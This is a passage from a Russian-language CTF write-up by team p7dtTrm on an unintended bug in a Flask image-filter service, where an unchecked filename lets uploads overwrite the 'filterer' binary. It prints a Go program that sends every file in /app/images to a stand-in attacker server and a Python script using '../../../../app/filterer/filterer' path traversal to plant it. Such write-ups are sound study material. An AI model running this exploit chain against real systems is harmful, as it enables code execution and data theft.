## Unintended сплойты

### Возможность переписать бинарь filterer на что угодно

можно заметить, что в обработчике `/apply_filter` никак не проверяется название файла, а метод `FileStorage.save` ([дока werkzeug](https://werkzeug.palletsprojects.com/en/stable/datastructures/#werkzeug.datastructures.FileStorage.save)) сохраняет файл по любому пути, никак не защищая от возможности переписать существующий файл.
```python
filename = request.form["filename"]
imagefile = request.files.get("image", "")
print(imagefile,file=sys.stderr)
if imagefile is None:
    return "<p1>Undefined</p1>"
usr = logged_users.get(cock)
if filename == "":
    return "<p1>Undefined filename</p1>"
imagefile.save("./images/" + usr + "/" + filename)
```

это позволяет переписать бинарь filterer на что-то своё. далее, этот подменённый бинарь будет запускаться при каждом использовании `/apply_filter`, в том числе при проверке чекером.

мы написали такой скрипт на go; он отправляет все файлы из `/app/images` к нам на сервер:
```go
package main

import (
	"bytes"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

func UploadFile(url string, paramName string, filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, filepath.Base(filePath))
	if err != nil {
		return err
	}
	_, err = io.Copy(part, file)
	err = writer.Close()
	if err != nil {
		return err
	}
	request, err := http.NewRequest("POST", url, body)
	request.Header.Add("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	return nil
}

func main() {
	_ = filepath.Walk("/app/images", func(path string, info os.FileInfo, err error) error {
		if err == nil {
			UploadFile("http://attackers.server:5000", "meow", path)
		}
		return nil
	})
}
```


сплойт для загрузки бинаря и его запуска:
```python
import requests, sys, random, string

ip = sys.argv[1]
letters = string.ascii_lowercase

username = "".join(random.choice(letters) for i in range(13))
password = "".join(random.choice(letters) for i in range(13))

login_data = {"username": username, "password": password}

s = requests.Session()
s.post(f"http://{ip}:6969/register", data=login_data)
s.post(f"http://{ip}:6969/login", data=login_data)

filename = "../../../../app/filterer/filterer"

resp = s.post(f"http://{ip}:6969/apply_filter", data={"filter": "black", "filename": filename}, files={'image': open("./dumper", "rb").read()})
print(resp.text)

s.post(f"http://{ip}:6969/apply_filter", data={"filter": "black", "filename": "flag"}, files={'image':"".join(random.choice(letters) for i in range(24))})
```

*от команды p7dtTrm*
